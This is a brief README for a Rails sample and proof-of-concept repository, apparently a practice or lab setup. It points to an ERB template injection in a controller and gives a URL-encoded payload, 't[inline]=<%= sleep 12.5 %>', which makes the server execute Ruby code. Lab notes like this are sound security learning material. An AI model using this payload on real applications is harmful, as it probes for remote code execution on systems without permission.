# railstestmachine
contains all sample and tut of rails , it may contains test PoC

# Rails Sample/PoC
~/workspace/PoC/app/app/controllers/book_controller.rb ->  basic

## :~/workspace/PoC/app/app/controllers -> #ERB injection here
    
    url: http://target/shit?t=payload_here
    Payload: shit?t[inline]=<%25%3D%20sleep%2012.5%20%25>

